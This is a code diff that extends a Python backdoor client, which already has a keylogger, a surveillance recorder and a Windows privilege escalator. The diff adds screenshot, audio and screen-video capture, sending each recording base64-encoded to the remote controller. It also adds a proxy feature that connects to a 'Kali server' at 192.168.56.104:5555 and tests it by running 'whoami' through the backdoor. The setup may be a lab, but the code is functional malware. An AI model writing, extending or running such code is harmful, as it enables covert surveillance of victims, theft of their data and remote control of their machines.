@@ -14,6 +14,7 @@ import os  # For interacting with the operating system
 keylogger = None
 recorder = None  
 privilege_escalator = None
+proxy_manager = None
 
 import sys
 import os
@@ -27,6 +28,7 @@ if current_dir not in sys.path:
 from features.keylogger import create_keylogger
 from features.recording import create_surveillance_recorder
 from features.privilege import Windows7PrivilegeEscalator
+from features.proxy import create_backdoor_proxy
 
 
 # Function to send data in a reliable way (encoded as JSON)
@@ -87,7 +89,7 @@ def download_file(file_name):
 
 # Main shell function for command execution with enhanced features
 def shell():
-    global keylogger, recorder, privilege_escalator
+    global keylogger, recorder, privilege_escalator, proxy_manager
     
     while True:
         # Receive a command from the remote host
@@ -148,25 +150,110 @@ def shell():
             try:
                 if recorder is None:
                     recorder = create_surveillance_recorder("recordings")
-                success, msg = recorder.screen_recorder.take_screenshot()
-                reliable_send("Screenshot: " + msg)
+                success, result = recorder.screen_recorder.take_screenshot()
+                if success:
+                    # Send screenshot data as base64
+                    import base64
+                    screenshot_data = {
+                        'action': 'screenshot',
+                        'filename': result['filename'],
+                        'data': base64.b64encode(result['data']).decode('utf-8'),
+                        'size': result['size']
+                    }
+                    reliable_send(screenshot_data)
+                else:
+                    reliable_send("Screenshot error: " + str(result))
             except Exception as e:
                 reliable_send("Screenshot error: " + str(e))
+                
+        elif command == 'start_audio':
+            try:
+                if recorder is None:
+                    recorder = create_surveillance_recorder("recordings")
+                success, msg = recorder.audio_recorder.start_recording(duration=30)
+                reliable_send("Audio recording started: " + str(msg))
+            except Exception as e:
+                reliable_send("Audio recording error: " + str(e))
+                
+        elif command == 'start_video':
+            try:
+                if recorder is None:
+                    recorder = create_surveillance_recorder("recordings")
+                success, msg = recorder.screen_recorder.start_screen_recording(duration=30)
+                reliable_send("Video recording started: " + str(msg))
+            except Exception as e:
+                reliable_send("Video recording error: " + str(e))
                 
         elif command == 'start_recording':
             try:
                 if recorder is None:
                     recorder = create_surveillance_recorder("recordings")
                 success, msg = recorder.start_surveillance(duration=30, audio=True, video=True)
-                reliable_send("Recording: " + msg)
+                reliable_send("Recording started: " + msg)
             except Exception as e:
                 reliable_send("Recording error: " + str(e))
+                
+        elif command == 'stop_audio':
+            try:
+                if recorder and recorder.audio_recorder.is_recording:
+                    success, result = recorder.audio_recorder.stop_recording()
+                    if success and isinstance(result, dict):
+                        # Send audio data as base64
+                        import base64
+                        audio_data = {
+                            'action': 'audio',
+                            'filename': result['filename'],
+                            'data': base64.b64encode(result['data']).decode('utf-8'),
+                            'size': result['size']
+                        }
+                        reliable_send(audio_data)
+                    else:
+                        reliable_send("Stop audio: " + str(result))
+                else:
+                    reliable_send("No audio recording active")
+            except Exception as e:
+                reliable_send("Stop audio error: " + str(e))
+                
+        elif command == 'stop_video':
+            try:
+                if recorder and recorder.screen_recorder.is_recording:
+                    success, result = recorder.screen_recorder.stop_screen_recording()
+                    if success and isinstance(result, dict):
+                        # Send video data as base64
+                        import base64
+                        video_data = {
+                            'action': 'video',
+                            'filename': result['filename'],
+                            'data': base64.b64encode(result['data']).decode('utf-8'),
+                            'size': result['size']
+                        }
+                        reliable_send(video_data)
+                    else:
+                        reliable_send("Stop video: " + str(result))
+                else:
+                    reliable_send("No video recording active")
+            except Exception as e:
+                reliable_send("Stop video error: " + str(e))
                 
         elif command == 'stop_recording':
             try:
                 if recorder:
-                    success, msg = recorder.stop_surveillance()
-                    reliable_send("Stop recording: " + msg)
+                    success, result = recorder.stop_surveillance()
+                    if success and isinstance(result, dict):
+                        # Send recording data as base64
+                        import base64
+                        recording_data = {
+                            'action': 'recording',
+                            'audio_filename': result.get('audio_filename'),
+                            'audio_data': base64.b64encode(result['audio_data']).decode('utf-8') if result.get('audio_data') else None,
+                            'audio_size': result.get('audio_size'),
+                            'video_filename': result.get('video_filename'),
+                            'video_data': base64.b64encode(result['video_data']).decode('utf-8') if result.get('video_data') else None,
+                            'video_size': result.get('video_size')
+                        }
+                        reliable_send(recording_data)
+                    else:
+                        reliable_send("Stop recording: " + str(result))
                 else:
                     reliable_send("No recording active")
             except Exception as e:
@@ -176,10 +263,143 @@ def shell():
             try:
                 if recorder is None:
                     recorder = create_surveillance_recorder("recordings")
-                recordings = recorder.list_recordings()
-                reliable_send("Recordings: " + json.dumps(recordings, indent=2))
+                msg = recorder.list_recordings()
+                reliable_send(msg)
             except Exception as e:
                 reliable_send("List recordings error: " + str(e))
+                
+        # PROXY COMMANDS
+        elif command == 'start_proxy':
+            try:
+                if proxy_manager is None:
+                    proxy_manager = create_backdoor_proxy('192.168.56.104', 5555)
+                success, msg = proxy_manager.start_proxy_operations()
+                reliable_send("proxy: " + msg)
+            except Exception as e:
+                reliable_send("proxy start error: " + str(e))
+                
+        elif command == 'stop_proxy':
+            try:
+                if proxy_manager:
+                    success, msg = proxy_manager.stop_proxy_operations()
+                    reliable_send("proxy: " + msg)
+                else:
+                    reliable_send("No proxy active")
+            except Exception as e:
+                reliable_send("proxy stop error: " + str(e))
+
+        elif command == 'proxy_status':
+            try:
+                if proxy_manager is None:
+                    proxy_manager = create_backdoor_proxy('192.168.56.104', 5555)
+                status = proxy_manager.get_proxy_status()
+                reliable_send("proxy Status: " + json.dumps(status, indent=2))
+            except Exception as e:
+                reliable_send("proxy status error: " + str(e))
+                
+        elif command == 'test_proxy':
+            try:
+                if proxy_manager is None:
+                    proxy_manager = create_backdoor_proxy('192.168.56.104', 5555)
+                
+                # Enhanced test with more details
+                if proxy_manager.channel and proxy_manager.channel.is_running:
+                    import socket
+                    test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    test_sock.settimeout(5)
+                    try:
+                        # Test local connection
+                        result = test_sock.connect_ex(('127.0.0.1', proxy_manager.channel.listen_port))
+                        if result == 0:
+                            # Try to send test data
+                            test_sock.send(b"test\n")
+                            test_sock.settimeout(2)
+                            try:
+                                response = test_sock.recv(100)
+                                test_sock.close()
+                                reliable_send(f"Proxy Test: Port {proxy_manager.channel.listen_port} working - got response: {len(response)} bytes")
+                            except:
+                                test_sock.close()
+                                reliable_send(f"Proxy Test: Port {proxy_manager.channel.listen_port} accepting connections but no response")
+                        else:
+                            test_sock.close()
+                            reliable_send(f"Proxy Test: Port {proxy_manager.channel.listen_port} not responding (error: {result})")
+                    except Exception as e:
+                        test_sock.close()
+                        reliable_send(f"Proxy Test: Connection failed: {str(e)}")
+                else:
+                    reliable_send("Proxy Test: Proxy not running")
+                    
+                # Also test target connectivity
+                try:
+                    target_test = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    target_test.settimeout(3)
+                    result = target_test.connect_ex(('192.168.56.104', 5555))
+                    target_test.close()
+                    if result == 0:
+                        reliable_send("Target Test: Can reach Kali server at 192.168.56.104:5555")
+                    else:
+                        reliable_send(f"Target Test: Cannot reach Kali server (error: {result})")
+                except Exception as e:
+                    reliable_send(f"Target Test: Error testing Kali connection: {str(e)}")
+                    
+            except Exception as e:
+                reliable_send("Proxy test error: " + str(e))
+
+        elif command == 'test_proxy_full':
+            try:
+                if proxy_manager is None:
+                    proxy_manager = create_backdoor_proxy('192.168.56.104', 5555)
+                
+                if proxy_manager.channel and proxy_manager.channel.is_running:
+                    import socket
+                    import json
+                    import time
+                    
+                    test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    test_sock.settimeout(10)
+                    
+                    try:
+                        # Connect to proxy
+                        result = test_sock.connect_ex(('127.0.0.1', proxy_manager.channel.listen_port))
+                        if result == 0:
+                            # Send a real backdoor command through proxy
+                            test_command = "whoami"
+                            json_command = json.dumps(test_command)
+                            test_sock.send(json_command.encode())
+                            
+                            # Wait for response
+                            time.sleep(2)
+                            try:
+                                response = test_sock.recv(4096)
+                                test_sock.close()
+                                
+                                if response:
+                                    # Try to decode JSON response
+                                    try:
+                                        decoded_response = json.loads(response.decode())
+                                        reliable_send(f"Proxy Full Test SUCCESS: Got response through proxy:\n{decoded_response}")
+                                    except:
+                                        reliable_send(f"Proxy Full Test: Got raw response through proxy:\n{response.decode()}")
+                                else:
+                                    reliable_send("Proxy Full Test: Connected but no response received")
+                            except Exception as e:
+                                test_sock.close()
+                                reliable_send(f"Proxy Full Test: Error receiving response: {str(e)}")
+                        else:
+                            test_sock.close()
+                            reliable_send(f"Proxy Full Test: Cannot connect to proxy port {proxy_manager.channel.listen_port}")
+                            
+                    except Exception as e:
+                        test_sock.close()
+                        reliable_send(f"Proxy Full Test: Connection error: {str(e)}")
+                        
+                else:
+                    reliable_send("Proxy Full Test: Proxy not running - use 'start_proxy' first")
+                    
+            except Exception as e:
+                reliable_send("Proxy full test error: " + str(e))
+
                 
         # PRIVILEGE ESCALATION COMMANDS
         elif command == 'check_privs':
